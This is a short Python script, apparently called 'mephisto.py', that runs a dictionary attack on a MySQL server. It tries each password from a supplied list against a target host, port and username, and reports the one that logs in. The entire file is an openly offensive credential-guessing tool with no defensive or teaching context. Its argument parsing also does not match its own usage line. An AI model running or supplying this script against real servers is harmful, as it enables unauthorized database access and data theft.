import sys
import mysql.connector
from mysql.connector import Error

def try_login(host, port, username, password):
    try:
        connection = mysql.connector.connect(
            host=host,
            port=port,
            user=username,
            password=password
        )
        if connection.is_connected():
            print(f"KEY FOUND [{password}]")
            connection.close()
            return True
    except Error:
        return False

def main(args):
    if len(args) < 5:
        print("Usage: mephisto.py -l username -P password_list mysql:<target_ip> port")
        sys.exit(1)
    
    username = args[args.index("-l") + 1]
    password_file = args[args.index("-P") + 1]
    target = args[args.index("mysql:") + 1]
    port = int(args[args.index("mysql:") + 2])

    try:
        with open(password_file, "r") as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"Password file '{password_file}' not found.")
        sys.exit(1)

    print(f"Starting attack on MySQL server at {target}:{port} with username '{username}'")

    for password in passwords:
        print(f"Trying password: {password}")
        if try_login(target, port, username, password):
            break
    else:
        print("KEY NOT FOUND")
        
if __name__ == "__main__":
    main(sys.argv)
